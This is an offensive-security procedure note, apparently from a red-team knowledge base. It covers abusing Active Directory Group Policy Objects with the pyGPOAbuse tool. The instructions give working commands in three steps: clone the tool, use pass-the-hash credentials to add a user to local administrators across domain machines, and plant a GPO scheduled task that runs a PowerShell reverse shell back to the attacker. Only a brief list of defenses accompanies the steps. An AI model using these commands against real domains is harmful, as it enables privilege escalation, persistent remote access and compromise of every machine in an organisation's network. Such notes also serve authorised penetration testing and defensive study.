---
id: b050f3f7-8775-49ee-b112-e147f01e44cf
name: Abuse-Group-Policy-Objects-with-pyGPOAbuse
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.703618+00:00'
updated_at: '2023-04-10T20:26:12.011925+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Boot or Logon Autostart Execution|T1547 - Boot or Logon
    Autostart Execution]]
  - '[[techniques/Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
  - '[[sub-techniques/Emond|T1546.014 - Emond]]'
  - '[[sub-techniques/Print Processors|T1547.012 - Print Processors]]'
tags:
  - '[[tags/Abuse GPO with pyGPOAbuse]]'
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Exploit Group Policy Objects GPO]]'
commands:
  - '[[commands/clone-pygpoabuse-repo]]'
  - '[[commands/pygpoabuse-add-user-to-admin-group]]'
  - '[[commands/pygpoabuse-create-reverse-shell-task]]'
tools:
  - '[[tools/pyGPOAbuse]]'
platforms:
  - Windows
  - Active Directory
validated: true
---

# Abuse-Group-Policy-Objects-with-pyGPOAbuse

## Summary

Abusing Group Policy Objects (GPOs) is a common technique used by attackers to gain persistence and elevate privileges within an Active Directory environment. pyGPOAbuse is a Python tool that allows an attacker to interact with GPOs and modify them in a variety of ways. This tool can be used to enable or disable certain policies, add new policies, or even execute arbitrary code as SYSTEM on all machines within the domain.

## Description

Abusing Group Policy Objects (GPOs) is a common technique used by attackers to gain persistence and elevate privileges within an Active Directory environment. pyGPOAbuse is a Python tool that allows an attacker to interact with GPOs and modify them in a variety of ways. This tool can be used to enable or disable certain policies, add new policies, or even execute arbitrary code as SYSTEM on all machines within the domain. Attackers can use this tool to escalate privileges and maintain persistence within the environment.

Technical Explanation: pyGPOAbuse works by abusing the SYSVOL share in Active Directory, which is used to distribute GPOs to all machines within the domain. By modifying the contents of the SYSVOL share, an attacker can modify the GPOs and execute arbitrary code on all machines within the domain. This technique is particularly dangerous because GPOs are automatically applied to all machines within the domain and are executed with SYSTEM privileges. Once an attacker has successfully modified a GPO, they can maintain persistence and escalate privileges within the environment.

Business Value: By abusing GPOs with pyGPOAbuse, attackers can gain persistent access to an organization's network and escalate their privileges. This can allow them to steal sensitive data, install malware, or cause other damage to the organization. Organizations should be aware of this technique and take steps to secure their GPOs and Active Directory environment.

## Requirements

1. Access to the Active Directory environment
2. Python and pyGPOAbuse installed on the attacker's machine
3. Credentials with permissions to modify GPOs

## Defense

Defensive measures and detection strategies:

1. Regularly review and monitor GPOs for unauthorized modifications
2. Restrict access to the SYSVOL share and GPOs to only authorized users
3. Implement least privilege access controls to limit the impact of GPO abuse

## Objectives

1. Gain persistence within the Active Directory environment
2. Escalate privileges to gain access to sensitive data
3. Maintain access to the environment for future attacks

## Instructions

### Step 1: Clone the pyGPOAbuse Repository

**Context**: Obtain the pyGPOAbuse tool from its GitHub repository to enable GPO modifications. This step sets up the local environment for executing the abuse commands.

**Command** ([[commands/clone-pygpoabuse-repo]]):
```bash
git clone https://github.com/Hackndo/pyGPOAbuse
```

> This clones the repository to the current directory, providing the pygpoabuse.py script. Expected output includes download progress and confirmation of the cloned files. Verify by checking for the pygpoabuse.py file with ls pygpoabuse.py.

### Step 2: Add User to Local Administrators Group

**Context**: Use pyGPOAbuse to modify a GPO and add a specified user to the local administrators group on domain machines, achieving privilege escalation.

**Command** ([[commands/pygpoabuse-add-user-to-admin-group]]):
```bash
./pygpoabuse.py $_DOMAIN/$_USERNAME -hashes $_LM_HASH:$_NT_HASH -gpo-id "$_GPO_ID" -command "net localgroup administrators $_USERNAME /add"
```

> This command authenticates with domain credentials (using hashes for pass-the-hash), targets a specific GPO ID, and executes a net command to add the user. Expected output: Confirmation of GPO modification and task creation. Success is indicated by the user being added to the administrators group on applied machines (verify via net localgroup administrators on a target).

### Step 3: Create Scheduled Task with Reverse Shell

**Context**: Modify a GPO to create a scheduled task that executes a PowerShell reverse shell, establishing persistence via event-triggered execution.

**Command** ([[commands/pygpoabuse-create-reverse-shell-task]]):
```bash
./pygpoabuse.py $_DOMAIN/$_USERNAME -hashes $_LM_HASH:$_NT_HASH -gpo-id "$_GPO_ID" -powershell -command "$_REVERSE_SHELL_COMMAND" -taskname "$_TASK_NAME" -description "$_TASK_DESCRIPTION" -user
```

> This embeds a PowerShell reverse shell command into a scheduled task via the GPO. The reverse shell code is referenced from [[codes/PowerShell-TCP-Reverse-Shell-for-GPO-Abuse]]. Expected output: Task creation confirmation in the GPO. Success indicators include the task appearing in Task Scheduler on domain machines and a connection back to the attacker's listener.
